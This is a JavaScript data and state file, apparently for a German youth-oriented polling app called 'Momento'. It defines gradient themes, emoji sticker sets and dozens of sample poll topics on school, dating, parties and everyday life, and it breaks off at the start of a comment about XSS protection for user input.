// DEFINE GRADIENTS / VIBES MAPPINGS
const vibes = {
  sunset: "bg-gradient-to-tr from-pink-600 via-orange-500 to-amber-400",
  teal: "bg-gradient-to-tr from-cyan-600 via-teal-500 to-emerald-400",
  orange: "bg-gradient-to-tr from-red-600 via-amber-600 to-yellow-500",
  twilight: "bg-gradient-to-tr from-indigo-700 via-purple-600 to-pink-500",
  gray: "bg-gradient-to-tr from-slate-800 via-slate-700 to-slate-900",
  vaporwave: "bg-gradient-to-tr from-blue-600 via-fuchsia-500 to-pink-500",
  mint: "bg-gradient-to-tr from-emerald-400 via-teal-500 to-blue-600",
  lava: "bg-gradient-to-tr from-red-700 via-rose-600 to-orange-500",
  forest: "bg-gradient-to-tr from-green-700 via-emerald-800 to-teal-900",
  neon: "bg-gradient-to-tr from-fuchsia-600 via-indigo-600 to-violet-800",
  cyberpunk: "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600",
  ocean: "bg-gradient-to-tr from-blue-800 via-cyan-600 to-teal-500",
  warm: "bg-gradient-to-tr from-amber-700 via-red-600 to-orange-500",
  bubblegum: "bg-gradient-to-tr from-pink-400 via-rose-400 to-pink-600",
  acid: "bg-gradient-to-tr from-lime-400 via-emerald-500 to-teal-600"
};

const vibeFriendlyNames = {
  sunset: "Neon Sunset",
  teal: "Chlorwasser",
  orange: "Kiosk-Sonne",
  twilight: "Zwielicht",
  gray: "Retro-Konsole",
  vaporwave: "Vaporwave",
  mint: "Teal Mint",
  lava: "Boden ist Lava",
  forest: "Dunkelwald",
  neon: "Neon-Trance",
  cyberpunk: "Cyberpunk",
  ocean: "Ozean-Tiefen",
  warm: "Kaminfeuer",
  bubblegum: "Bubblegum",
  acid: "Lime Acid"
};

// KATEGORISIERTE STICKER-BIBLIOTHEK
const categorizedStickers = [
  {
    name: "🎮 Retro & Tech",
    items: ["📼", "🕹️", "📻", "💾", "🖥️", "📟", "📞", "📺", "📷", "🔋", "🤖", "🎮", "⌨️", "🖨️", "💿", "📠", "☎️", "📡", "🔌", "💡", "⏰", "📽️", "🎞️", "🔭", "🔬", "💻", "🖱️", "📱", "🧮", "📸", "🧭", "🎚️", "🎛️", "🔦", "🕯️", "🔍", "🔎", "🗄️", "🗃️", "💽", "🧲", "🛰️", "🎙️", "📯", "📢", "📣", "🔔", "🔕", "🔐", "🔓", "🔒", "🗝️", "⏱️", "⏲️", "🧾"]
  },
  {
    name: "🍟 Food & Kiosk",
    items: ["🍟", "🍿", "🍦", "🍭", "🍉", "🍹", "🍩", "🍕", "🍔", "🍓", "🥤", "🍒", "🌭", "🥨", "🧁", "🍪", "🍫", "🍬", "🍮", "🍰", "🎂", "🍎", "🍌", "🍇", "🍑", "🍋", "🥭", "🍍", "🥝", "🍗", "🌮", "🌯", "🥪", "🍜", "🍝", "🍳", "🥓", "🧇", "🥞", "🍯", "🧃", "🍺", "🥐", "🥯", "🧈", "🥖", "🍞", "🧀", "🥗", "🌶️", "🥑", "🍆", "🥒", "🥦", "🌽", "🥕", "🧅", "🧄", "🥔", "🍠", "🥟", "🍤", "🍣", "🍱", "🍥", "🥮", "🍡", "🍧", "🍨", "🥧", "🧊", "🍸", "🍷", "🍾", "🧋", "☕", "🍵", "🥛"]
  },
  {
    name: "🛹 Freizeit & Vibe",
    items: ["🛹", "🎈", "🔑", "🦖", "🏫", "🚲", "🏝️", "🎸", "🕶️", "🎳", "🎒", "🛼", "⛺", "🛸", "🌅", "🌋", "🎯", "🎲", "🧩", "🎨", "🎤", "🎧", "🏀", "⚽", "🏈", "🎾", "🏓", "🏸", "🥏", "🏕️", "🌄", "🌊", "🏖️", "🚗", "🛴", "✈️", "🚀", "🌌", "🎆", "🎇", "🧨", "🎿", "🏂", "⛸️", "🥊", "🥋", "🏹", "⛳", "🏌️", "🚴", "🏊", "🤿", "🏄", "🧗", "🎪", "🎡", "🎢", "🎠", "🖼️", "🎬", "📚", "🏆", "🥇", "🛶", "🚤", "🛵", "🚡", "🚠", "🗺️"]
  },
  {
    name: "😄 Gesichter & Gefühle",
    items: ["😍", "😂", "😎", "🥳", "😴", "🤔", "😇", "🙈", "😭", "🥺", "😱", "🤯", "🙄", "😏", "🥶", "🥵", "🤗", "😜", "🤩", "😳", "🫠", "🤠", "😤", "🥴", "😬", "🤤", "😌", "🙃", "😅", "🫡", "😁", "😆", "😊", "🙂", "😉", "😋", "😝", "🤪", "🤨", "🧐", "😐", "😑", "😶", "😮", "😯", "😲", "🥱", "😪", "😵", "🤐", "😷", "🤒", "🤕", "🤢", "🤮", "🥹", "😢", "😥", "😓", "🫣", "🫢", "🤭", "🫤", "😔", "😞", "😟", "😕", "🙁", "☹️", "😩", "😫", "😨", "😰", "😖", "😣", "😡", "😠", "🤬", "😈", "👿"]
  },
  {
    name: "🐾 Tiere",
    items: ["🐶", "🐱", "🦊", "🐻", "🐼", "🐨", "🦁", "🐯", "🐮", "🐷", "🐸", "🐵", "🦄", "🐔", "🦉", "🦇", "🐺", "🐗", "🐴", "🦋", "🐝", "🐌", "🐢", "🦈", "🐙", "🦑", "🐳", "🐬", "🦩", "🦔", "🐭", "🐹", "🐰", "🦝", "🦫", "🦦", "🦥", "🐿️", "🦌", "🐐", "🐑", "🐄", "🐖", "🐓", "🐤", "🐣", "🐥", "🦆", "🦅", "🦢", "🦃", "🐍", "🦎", "🐊", "🐆", "🦓", "🦒", "🐘", "🦏", "🦛", "🐫", "🐪", "🦙", "🐩", "🐈", "🐕", "🐇", "🐁", "🐀", "🦡", "🦨"]
  },
  {
    name: "💖 Emotion & Magic",
    items: ["💋", "🤫", "💖", "💌", "🌟", "🔥", "🌈", "👽", "🧸", "✨", "💯", "🎉", "🎊", "💫", "⭐", "🌙", "☀️", "🍀", "🕊️", "👻", "💀", "🎭", "🩷", "💜", "💙", "💚", "🧿", "🔮", "🪄", "⚡", "💛", "🧡", "❤️", "🖤", "🤍", "🤎", "💔", "❣️", "💕", "💞", "💓", "💗", "💘", "💝", "🎀", "🎁", "🌠", "🐉", "🧚", "🧞", "🧜", "🧙", "🕷️", "🕸️", "🎃", "🧛", "🧟", "🌑", "🌕", "🌗"]
  }
];

// DATENBANK DER THEMEN (Ersetze diesen Teil in script.js)
let masterTopics = [
  // --- ORIGINALE ---
  {
    id: "freibadpommes",
    title: "Freibadpommes",
    category: "damals",
    memories: [
      { user: "Marc_88", time: "vor 10 Min.", text: "Immer mit 50 Pfennig Restgeld nach dem Wettschwimmen geholt!", color: "text-retro-accent" },
      { user: "SommerKind92", time: "vor 1 Std.", text: "Der Geruch von Chlor und dazu die krossen Pommes.", color: "text-retro-secondary" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "sunset",
        sticker: "🍟",
        type: "versus",
        leftLabel: "Mayo 🍟",
        rightLabel: "Ketchup 🍅",
        stats: { communityAverage: 65 }
      }
    ]
  },
  {
    id: "erster-kuss",
    title: "Der erste Kuss",
    category: "damals",
    memories: [
      { user: "TeenSpirit90", time: "vor 45 Min.", text: "Aua, Zahnspangen-Kollision des Todes damals!", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "twilight",
        sticker: "💋",
        type: "choice",
        options: [
          { name: "Mit Zunge 👅", percent: "42%" },
          { name: "Ohne Zunge 💋", percent: "33%" },
          { name: "Überfordert 😳", percent: "25%" }
        ]
      }
    ]
  },

  // --- SCHÜTZENFEST & DORFPARTY ---
  {
    id: "schuetzenfest",
    title: "Schützenfest",
    category: "heute",
    memories: [
      { user: "Dorfkind_99", time: "vor 20 Min.", text: "Einmal im Jahr Ausnahmezustand im ganzen Ort!", color: "text-retro-accent" },
      { user: "Laura_M", time: "vor 2 Std.", text: "Jedes Mal heiser am nächsten Tag 😭", color: "text-amber-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "forest",
        sticker: "🍺",
        type: "versus",
        leftLabel: "Jedes Jahr Pflicht 🍺",
        rightLabel: "Gar kein Bock 🙅‍♂️",
        stats: { communityAverage: 68 }
      }
    ]
  },
  {
    id: "dorfparty-festzelt",
    title: "Festzelt & Bänke",
    category: "heute",
    memories: [
      { user: "Hannes_05", time: "vor 1 Std.", text: "Erst auf der Bank stehen, wenn der Malle-Hit läuft!", color: "text-retro-secondary" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "warm",
        sticker: "🎪",
        type: "choice",
        options: [
          { name: "Auf der Bank 🕺", percent: "50%" },
          { name: "An der Bar 🍻", percent: "35%" },
          { name: "Draußen quatschen 🗣️", percent: "15%" }
        ]
      }
    ]
  },

  // --- PARTY & ALKOHOL ---
  {
    id: "mische-mischen",
    title: "Mische mischen",
    category: "heute",
    memories: [
      { user: "Tobi_Abi25", time: "vor 15 Min.", text: "50/50 schmeckt nach 'Morgen schlafen wir durch'.", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "lava",
        sticker: "🍹",
        type: "versus",
        leftLabel: "50 / 50 Mischung 🍹",
        rightLabel: "Nur Homöopathisch 💧",
        stats: { communityAverage: 58 }
      }
    ]
  },
  {
    id: "kurze-trinken",
    title: "Pfeffi & Shots",
    category: "heute",
    memories: [
      { user: "Marie_K", time: "vor 4 Std.", text: "Pfeffi schmeckt wie Zähneputzen mit Alkohol-Bonus.", color: "text-cyan-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "acid",
        sticker: "🥃",
        type: "versus",
        leftLabel: "Niemals Kurze 🛑",
        rightLabel: "Trinke alles 🔥",
        stats: { communityAverage: 60 }
      }
    ]
  },
  {
    id: "filmriss-symptome",
    title: "Morgen nach der Party",
    category: "heute",
    memories: [
      { user: "Sven_06", time: "vor 30 Min.", text: "Anrufhistorie und Chatverläufe durchgehen ist Zitterpartie.", color: "text-purple-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "orange",
        sticker: "🌀",
        type: "choice",
        options: [
          { name: "Filmriss 🌀", percent: "30%" },
          { name: "Cringe-Voices 🙈", percent: "45%" },
          { name: "Alles klar 👍", percent: "25%" }
        ]
      }
    ]
  },

  // --- BEZIEHUNGEN & DATING ---
  {
    id: "situationship",
    title: "Beziehungsstatus",
    category: "heute",
    memories: [
      { user: "Elena_W", time: "vor 45 Min.", text: "Einfach 'Wir schauen wohin es führt' seit 8 Monaten 😂", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "bubblegum",
        sticker: "💔",
        type: "choice",
        options: [
          { name: "Vergeben 💍", percent: "40%" },
          { name: "Kompliziert 🌀", percent: "45%" },
          { name: "Glücklich Single 🕺", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "eifersucht-level",
    title: "Eifersucht",
    category: "heute",
    memories: [
      { user: "Klara_99", time: "vor 1 Std.", text: "Finde in 2 Minuten raus wer das Foto geliked hat.", color: "text-retro-accent" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "twilight",
        sticker: "👁️",
        type: "versus",
        leftLabel: "Voll entspannt 🧊",
        rightLabel: "FBI-Detektiv 🔍",
        stats: { communityAverage: 60 }
      }
    ]
  },
  {
    id: "kontakt-zum-ex",
    title: "Kontakt zum Ex",
    category: "heute",
    memories: [
      { user: "Ben_04", time: "vor 3 Std.", text: "Blockieren spart einfach extrem viele Nerven.", color: "text-retro-secondary" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "gray",
        sticker: "🚫",
        type: "versus",
        leftLabel: "Noch befreundet 🤝",
        rightLabel: "Überall geblockt 🚫",
        stats: { communityAverage: 65 }
      }
    ]
  },
  {
    id: "erstes-date-location",
    title: "Erstes Date",
    category: "heute",
    memories: [
      { user: "Lukas_H", time: "vor 2 Std.", text: "Spaziergang ist Top, man kann schnell flüchten 🏃", color: "text-amber-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "neon",
        sticker: "☕",
        type: "choice",
        options: [
          { name: "Spazieren/Kaffee ☕", percent: "50%" },
          { name: "Bar / Trinken 🍹", percent: "35%" },
          { name: "Zuhause Chillen 🛋️", percent: "15%" }
        ]
      }
    ]
  },

  // --- PERSÖNLICHKEITSTEST & VIBES ---
  {
    id: "sozialer-akku",
    title: "Sozialer Akku",
    category: "heute",
    memories: [
      { user: "Sina_S", time: "vor 10 Min.", text: "Nach 2 Stunden Party brauche ich 3 Tage Funkstille.", color: "text-cyan-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "mint",
        sticker: "🔋",
        type: "versus",
        leftLabel: "Introvertiert 🧘",
        rightLabel: "Extrovertiert ⚡",
        stats: { communityAverage: 50 }
      }
    ]
  },
  {
    id: "bauch-oder-kopf",
    title: "Entscheidungen",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "cyberpunk",
        sticker: "🧠",
        type: "versus",
        leftLabel: "Nur Bauchgefühl ❤️",
        rightLabel: "Kopf & Logik 🧠",
        stats: { communityAverage: 52 }
      }
    ]
  },
  {
    id: "overthinking",
    title: "Overthinking",
    category: "heute",
    memories: [
      { user: "Nico_05", time: "vor 50 Min.", text: "Analysiere den Punkt am Ende der Nachricht seit 4 Stunden.", color: "text-purple-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "ocean",
        sticker: "🌀",
        type: "versus",
        leftLabel: "YOLO / Egal 😎",
        rightLabel: "Overthinker 3000 🧠",
        stats: { communityAverage: 70 }
      }
    ]
  },
  {
    id: "nachtmensch-oder-frueh",
    title: "Tagesrhythmus",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "twilight",
        sticker: "🦉",
        type: "versus",
        leftLabel: "Frühaufsteher 🌅",
        rightLabel: "Nachteule 🦉",
        stats: { communityAverage: 70 }
      }
    ]
  },

  // --- SPECIAL 17/18: FÜHRERSCHEIN, CLUB, VOLLJÄHRIGKEIT ---
  {
    id: "fahrpruefung",
    title: "Praktische Fahrprüfung",
    category: "heute",
    memories: [
      { user: "Basti_07", time: "vor 10 Min.", text: "Blinker vergessen beim Rückwärtsfahren... ZACK durchgefallen.", color: "text-retro-accent" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "orange",
        sticker: "🚗",
        type: "versus",
        leftLabel: "Beim 1. Mal 🚘",
        rightLabel: "Durchgefallen 😭",
        stats: { communityAverage: 72 }
      }
    ]
  },
  {
    id: "eltern-auto",
    title: "Mamas Auto leihen",
    category: "heute",
    memories: [
      { user: "Lisa_A", time: "vor 3 Std.", text: "Immer den Tank auf Reserve zurückgestellt ups.", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "neon",
        sticker: "🔑",
        type: "choice",
        options: [
          { name: "Betteln 🥺", percent: "45%" },
          { name: "Muss tanken ⛽", percent: "35%" },
          { name: "Verboten 🚫", percent: "20%" }
        ]
      }
    ]
  },
  {
    id: "vorgluehen",
    title: "Vorglühen",
    category: "heute",
    memories: [
      { user: "Marten_2006", time: "vor 1 Std.", text: "Vorglühen ist immer 10x lustiger als die eigentliche Party.", color: "text-amber-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "lava",
        sticker: "🍻",
        type: "versus",
        leftLabel: "Besser als Party 🎉",
        rightLabel: "Direkt in Club 🪩",
        stats: { communityAverage: 64 }
      }
    ]
  },
  {
    id: "club-einlass",
    title: "Club-Einlass",
    category: "heute",
    memories: [
      { user: "Fabian_B", time: "vor 20 Min.", text: "Türsteher schaut den Perso an als wär's ein gefälschter Pass.", color: "text-retro-secondary" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "twilight",
        sticker: "🪩",
        type: "choice",
        options: [
          { name: "Perso zeigen 🪪", percent: "50%" },
          { name: "Locker durch 👍", percent: "35%" },
          { name: "Abgewiesen 🚫", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "selbst-unterschreiben",
    title: "Entschuldigung ab 18",
    category: "heute",
    memories: [
      { user: "Tim_06", time: "vor 5 Std.", text: "Einfach 'Privater Grund' reinschreiben ist das mächtigste Gefühl.", color: "text-cyan-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "cyberpunk",
        sticker: "✍️",
        type: "versus",
        leftLabel: "Selber schreiben ✍️",
        rightLabel: "Trotzdem Mama 🙈",
        stats: { communityAverage: 58 }
      }
    ]
  },
  {
    id: "zukunft-nach-schule",
    title: "Plan nach der Schule",
    category: "heute",
    memories: [
      { user: "Maja_Abi", time: "vor 2 Std.", text: "Einfach erst mal Work & Travel nach Australien so wie alle 😂", color: "text-purple-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "warm",
        sticker: "🎓",
        type: "versus",
        leftLabel: "Plan steht 📝",
        rightLabel: "Null Ahnung 🤷",
        stats: { communityAverage: 60 }
      }
    ]
  },
  {
    id: "kater-am-sonntag",
    title: "Kater am Sonntag",
    category: "heute",
    memories: [
      { user: "David_05", time: "vor 40 Min.", text: "Liege mit Spezi im abgedunkelten Zimmer.", color: "text-retro-accent" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "acid",
        sticker: "🤢",
        type: "versus",
        leftLabel: "Fit wie Turnschuh 👟",
        rightLabel: "Todeszustand 💀",
        stats: { communityAverage: 70 }
      }
    ]
  },
  {
    id: "dating-apps",
    title: "Tinder & Bumble",
    category: "heute",
    memories: [
      { user: "Hannah_04", time: "vor 3 Std.", text: "Treffe da nur Leute aus der Nachbarstadt die man eh kennt.", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "bubblegum",
        sticker: "🔥",
        type: "choice",
        options: [
          { name: "Aktiv Swipen 🔥", percent: "40%" },
          { name: "Nur für Cringe 🍿", percent: "40%" },
          { name: "Niemals 🙅‍♂️", percent: "20%" }
        ]
      }
    ]
  },
  {
    id: "erstes-gehalt",
    title: "Erster Nebenjob-Lohn",
    category: "heute",
    memories: [
      { user: "Noah_06", time: "vor 1 Std.", text: "500€ aufm Konto gefühlt wie Elon Musk.", color: "text-retro-secondary" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "teal",
        sticker: "💸",
        type: "choice",
        options: [
          { name: "Sofort weg 🛍️", percent: "50%" },
          { name: "Eisern sparen 🏦", percent: "35%" },
          { name: "Führerschein 🚗", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "auszug-zuhause",
    title: "Ausziehen von Zuhause",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "mint",
        sticker: "🔑",
        type: "versus",
        leftLabel: "So schnell wie möglich ✈️",
        rightLabel: "Hotel Mama 🏠",
        stats: { communityAverage: 50 }
      }
    ]
  },
  {
    id: "tanken-gehen",
    title: "An der Tankstelle",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "sunset",
        sticker: "⛽",
        type: "versus",
        leftLabel: "Nur für 10€ ⛽",
        rightLabel: "Volltanken 💳",
        stats: { communityAverage: 70 }
      }
    ]
  },
  {
    id: "letzte-bahn",
    title: "Die letzte Bahn",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "gray",
        sticker: "🚆",
        type: "choice",
        options: [
          { name: "Rennen 🏃", percent: "45%" },
          { name: "Uber / Taxi 🚕", percent: "35%" },
          { name: "Durchmachen 🌅", percent: "20%" }
        ]
      }
    ]
  },

  // --- FINANZEN, GYM & NIGHTLIFE ---
  {
    id: "paypal-freunde",
    title: "Paypal an Freunde",
    category: "heute",
    memories: [
      { user: "Julian_K", time: "vor 15 Min.", text: "Die Verwendungszwecke sind immer das Peinlichste daran.", color: "text-amber-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "teal",
        sticker: "💸",
        type: "choice",
        options: [
          { name: "Sofort senden 💸", percent: "55%" },
          { name: "Erinnern 🔔", percent: "35%" },
          { name: "Vergessen 🙈", percent: "10%" }
        ]
      }
    ]
  },
  {
    id: "akku-beim-feiern",
    title: "Akku beim Feiern",
    category: "heute",
    memories: [
      { user: "Sarah_05", time: "vor 2 Std.", text: "Powerbank in der Handtasche ist absoluter Lebensretter.", color: "text-cyan-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "orange",
        sticker: "🔋",
        type: "versus",
        leftLabel: "100% geladen 🔋",
        rightLabel: "12% & Hoffnung 💀",
        stats: { communityAverage: 80 }
      }
    ]
  },
  {
    id: "waesche-waschen",
    title: "Wäsche waschen",
    category: "heute",
    memories: [
      { user: "Finn_04", time: "vor 4 Std.", text: "Einmal das rote Shirt mitgewaschen und alles ist jetzt rosa.", color: "text-purple-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "mint",
        sticker: "🧺",
        type: "versus",
        leftLabel: "Nach Farben ⚪",
        rightLabel: "Alles zusammen 🎨",
        stats: { communityAverage: 45 }
      }
    ]
  },
  {
    id: "kaffee-konsum",
    title: "Kaffee-Konsum",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "warm",
        sticker: "☕",
        type: "versus",
        leftLabel: "Gar kein Kaffee 🍵",
        rightLabel: "4 Tassen täglich ☕",
        stats: { communityAverage: 60 }
      }
    ]
  },
  {
    id: "konzert-karten",
    title: "Konzert-Karten",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "twilight",
        sticker: "🎟️",
        type: "versus",
        leftLabel: "Stehplatz vorne 🔥",
        rightLabel: "Sitzplatz hinten 🪑",
        stats: { communityAverage: 62 }
      }
    ]
  },
  {
    id: "gym-abo",
    title: "Gym-Abo nutzen",
    category: "heute",
    memories: [
      { user: "Marco_05", time: "vor 30 Min.", text: "Zahle seit 8 Monaten Beitrag als Spende für den Verein.", color: "text-retro-accent" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "acid",
        sticker: "🏋️",
        type: "versus",
        leftLabel: "4x die Woche 🏋️",
        rightLabel: "Zahle nur Karte 💤",
        stats: { communityAverage: 60 }
      }
    ]
  },
  {
    id: "kater-fruehstueck",
    title: "Kater-Frühstück",
    category: "heute",
    memories: [
      { user: "Leonie_M", time: "vor 1 Std.", text: "Kalter Döner vom Vortag um 13 Uhr schmeckt göttlich.", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "lava",
        sticker: "🍕",
        type: "choice",
        options: [
          { name: "Fettige Pizza 🍕", percent: "60%" },
          { name: "Nur Wasser 💧", percent: "25%" },
          { name: "Gar nichts 🤢", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "sag-bescheid",
    title: "Sag Bescheid wenn da",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "bubblegum",
        sticker: "💬",
        type: "versus",
        leftLabel: "Schreibe immer 💬",
        rightLabel: "Vergesse es 🙈",
        stats: { communityAverage: 40 }
      }
    ]
  },
  {
    id: "online-retoure",
    title: "Online-Retoure",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "vaporwave",
        sticker: "📦",
        type: "versus",
        leftLabel: "Sofort zurück 📦",
        rightLabel: "Liegt 3 Monate ⏳",
        stats: { communityAverage: 55 }
      }
    ]
  },
  {
    id: "gruppenfoto",
    title: "Gruppenfoto",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "neon",
        sticker: "📸",
        type: "choice",
        options: [
          { name: "Insta-Story 📸", percent: "45%" },
          { name: "Nur für uns 🔒", percent: "40%" },
          { name: "Niemals posten 🙈", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "spotify-wrapped",
    title: "Spotify Wrapped",
    category: "heute",
    memories: [
      { user: "Erik_06", time: "vor 20 Min.", text: "Top 1% Hörer bei einer Band wo ich mich frage wann ich das gehört hab.", color: "text-retro-secondary" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "cyberpunk",
        sticker: "🎧",
        type: "choice",
        options: [
          { name: "Stolz teilen 📲", percent: "50%" },
          { name: "Zu peinlich 🙈", percent: "35%" },
          { name: "Egal 🤷", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "ausschlafen-wochenende",
    title: "Ausschlafen Sa/So",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "sunset",
        sticker: "😴",
        type: "versus",
        leftLabel: "Um 08:00 wach ☀️",
        rightLabel: "Bis 14:00 Bett 🛌",
        stats: { communityAverage: 70 }
      }
    ]
  },

  // --- ALLTAG & SCHULE ---
  {
    id: "freistunde",
    title: "Freistunde",
    category: "heute",
    memories: [
      { user: "Jan_06", time: "vor 3 Std.", text: "Beim Bäcker 8€ gelassen für belegtes Brötchen und Spezi.", color: "text-amber-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "teal",
        sticker: "🏫",
        type: "choice",
        options: [
          { name: "Bäckerei 🥐", percent: "45%" },
          { name: "Schulhof 🎒", percent: "35%" },
          { name: "Heimgehen 🏠", percent: "20%" }
        ]
      }
    ]
  },
  {
    id: "akku-bei-5-prozent",
    title: "Akku bei 5%",
    category: "heute",
    memories: [
      { user: "Saskia_M", time: "vor 5 Std.", text: "Der Akku hält auf 1% gefühlt länger als bei 100%.", color: "text-cyan-400" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "orange",
        sticker: "🔋",
        type: "choice",
        options: [
          { name: "Sparmodus ⚡", percent: "52%" },
          { name: "Ladekabel 🔌", percent: "33%" },
          { name: "Beten 💀", percent: "15%" }
        ]
      }
    ]
  },
  {
    id: "doener-bestellung",
    title: "Döner",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "lava",
        sticker: "🥙",
        type: "versus",
        leftLabel: "Mit alles 🔥",
        rightLabel: "Ohne Zwiebeln 🧄",
        stats: { communityAverage: 68 }
      }
    ]
  },
  {
    id: "schulweg",
    title: "Schulweg",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "neon",
        sticker: "🎧",
        type: "versus",
        leftLabel: "Musik an 🎧",
        rightLabel: "Mit Freunden 🗣️",
        stats: { communityAverage: 55 }
      }
    ]
  },
  {
    id: "muendlich-melden",
    title: "Mündlich melden",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "cyberpunk",
        sticker: "🙋‍♂️",
        type: "versus",
        leftLabel: "Nie 🤐",
        rightLabel: "Immer 🖐️",
        stats: { communityAverage: 40 }
      }
    ]
  },
  {
    id: "wecker-snooze",
    title: "Wecker-Snooze",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "acid",
        sticker: "⏰",
        type: "versus",
        leftLabel: "Sofort auf ☀️",
        rightLabel: "5x Snooze 💤",
        stats: { communityAverage: 80 }
      }
    ]
  },
  {
    id: "anruf-ohne-name",
    title: "Anruf ohne Name",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "gray",
        sticker: "📞",
        type: "choice",
        options: [
          { name: "Rangehen 🗣️", percent: "22%" },
          { name: "Googeln 🔍", percent: "48%" },
          { name: "Wegdrücken 📵", percent: "30%" }
        ]
      }
    ]
  },
  {
    id: "lernen-auf-luecke",
    title: "Lernen auf Lücke",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "warm",
        sticker: "📖",
        type: "versus",
        leftLabel: "Alles gelernt 🤓",
        rightLabel: "Garnicht gelernt 🎲",
        stats: { communityAverage: 70 }
      }
    ]
  },
  {
    id: "klassenchat",
    title: "Klassenchat",
    category: "heute",
    memories: [
      { user: "Anna_05", time: "vor 4 Std.", text: "Seit 2 Jahren stumm auf 'Immer'. Beste Entscheidung.", color: "text-pink-500" }
    ],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "bubblegum",
        sticker: "💬",
        type: "choice",
        options: [
          { name: "Stummgeschaltet 🔇", percent: "62%" },
          { name: "Nur Mitlesen 🍿", percent: "28%" },
          { name: "Aktiv Schreiben 🗣️", percent: "10%" }
        ]
      }
    ]
  },
  {
    id: "bildschirmzeit",
    title: "Bildschirmzeit",
    category: "heute",
    memories: [],
    versions: [
      {
        id: "v1",
        author: "Momento",
        vibe: "mint",
        sticker: "📱",
        type: "versus",
        leftLabel: "1 Stunde 🍃",
        rightLabel: "8 Stunden+ 💀",
        stats: { communityAverage: 70 }
      }
    ]
  }
];

let filteredTopics = [];
let currentTopicIndex = 0;
let currentVersionIndex = 0;
let selectedChoice = "";

// ==========================================
// FREMDEINSCHÄTZUNG ("WIE SIEHST DU MICH?")
// ==========================================
// shareMode:       Im Share-Modal gewählter Modus (Ersteller-Sicht).
//                   'match'    -> normaler Vibe-Match (bestehendes Verhalten)
//                   'estimate' -> Fremdeinschätzung ("Wie siehst du mich?")
// estimateContext: Wird beim Laden aus der URL befüllt, wenn die Seite über
//                   einen ?mode=estimate-Link geöffnet wurde (Empfänger-Sicht).
//                   { creatorName, creatorVal, topicId, versionId } oder null.
// estimateRevealed: Ob der Empfänger die Auflösung (echter Wert des Erstellers)
//                    für die aktuell offene Karte schon angeklickt hat.
let shareMode = 'match';
let estimateContext = null;
let estimateRevealed = false;

// ==========================================
// SICHERHEIT: XSS-SCHUTZ FÜR NUTZEREINGABEN
// ==========================================
// Was ist das Problem, das diese Funktion löst?
// An vielen Stellen im Code baust du HTML-Schnipsel per Template-String
